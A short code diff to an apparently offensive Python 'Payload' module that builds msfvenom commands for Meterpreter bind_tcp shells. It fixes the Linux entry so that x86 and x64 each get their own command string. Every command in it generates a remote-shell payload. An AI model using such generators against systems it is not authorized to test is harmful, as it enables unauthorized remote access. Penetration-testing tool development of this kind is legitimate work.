@@ -35,7 +35,10 @@ class Payload(controller.Module):
 					'x86': 'msfvenom -p windows/meterpreter/bind_tcp -a {} '.format(self.architecture),
 					'x64': 'msfvenom -p windows/x64/meterpreter/bind_tcp -a {} '.format(self.architecture)
 				},
-				'linux': 'msfvenom -p linux/{}/meterpreter/bind_tcp -a '.format(self.architecture, self.architecture)
+				'linux': {
+					'x86': 'msfvenom -p linux/x86/meterpreter/bind_tcp -a x86',
+					'x64': 'msfvenom -p linux/x64/meterpreter/bind_tcp -a x64'
+				}
 			}
 			randiter = str(random.randint(7, 18))
 			generate = generate[self.platform][self.architecture] + 'lport={} '.format(self.lport)
